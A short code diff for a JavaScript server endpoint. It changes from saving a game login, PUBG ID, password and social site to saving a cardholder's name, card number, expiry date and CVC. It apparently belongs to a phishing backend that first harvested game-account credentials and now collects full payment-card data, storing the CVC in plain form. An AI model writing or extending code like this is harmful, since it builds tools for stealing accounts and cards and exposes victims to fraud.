@@ -1,14 +1,14 @@
 import cardModel from "../../models/card.js";
 
 export const createInformation = async (req, res) => {
-  const { login, pubgId, password, socialSite } = req.body;
+  const { name, cardNumber, expiry, cvc } = req.body;
 
   try {
     const information = await cardModel.create({
-      login,
-      pubgId,
-      password,
-      socialSite,
+      cvc,
+      name,
+      cardNumber,
+      expiry,
     });
     res.status(200).json("ok");
   } catch (err) {
